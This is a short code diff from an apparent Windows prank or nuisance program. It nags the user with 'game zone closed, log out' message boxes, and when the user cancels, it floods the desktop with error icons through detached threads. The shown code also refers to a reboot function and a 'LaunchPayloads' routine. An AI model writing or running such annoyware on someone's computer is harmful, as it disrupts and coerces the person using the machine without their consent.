@@ -60,7 +60,6 @@ void reboot(void)
 
 void PayloadMessageBox(void)
 {
-	
 	const LPCTSTR messages[]{
 		L"Please exit the game zone lol!",
 		L"Please stop play game!!!1!!",
@@ -192,19 +191,18 @@ void displayIcon(HDC hdc, int ix, int iy, int w, int h, HICON icon) {
 }
 
 void yesnobox(void) {
-	int ix = GetSystemMetrics(SM_CXICON) / 2;
-	int iy = GetSystemMetrics(SM_CYICON) / 2;
-	HWND hwnd = GetDesktopWindow();
-	HDC hdc = GetWindowDC(hwnd);
-	RECT r;
-	GetWindowRect(hwnd, &r);
-	int w = r.right - r.left;
-	int h = r.bottom - r.top;
-	// TODO: change icon to ok_hand boi
-	HICON icon = LoadIcon(nullptr, IDI_ERROR);
-
-	if (MessageBox(nullptr, L"Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND | MB_APPLMODAL) == IDCANCEL) {
+	if (MessageBox(nullptr, L"The game zone is closed at this time.  Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND | MB_APPLMODAL) == IDCANCEL) {
 		for (int i = 0; i < 10; ++i) {
+			int ix = GetSystemMetrics(SM_CXICON) / 2;
+			int iy = GetSystemMetrics(SM_CYICON) / 2;
+			HWND hwnd = GetDesktopWindow();
+			HDC hdc = GetWindowDC(hwnd);
+			RECT r;
+			GetWindowRect(hwnd, &r);
+			int w = r.right - r.left;
+			int h = r.bottom - r.top;
+			HICON icon = LoadIcon(nullptr, IDI_ERROR);
+
 			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
 		}
 		std::this_thread::sleep_for(std::chrono::seconds(5));
@@ -238,8 +236,8 @@ int main(void)
 		std::thread(yesnobox).detach();
 		std::thread(LaunchPayloads).detach();
 		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
-			std::cout << "running for: " << runtime << std::endl;
 #ifdef TEST
+			std::cout << "running for: " << runtime << std::endl;
 			std::this_thread::sleep_for(std::chrono::seconds(5));
 #else
 			std::this_thread::sleep_for(std::chrono::seconds(60));
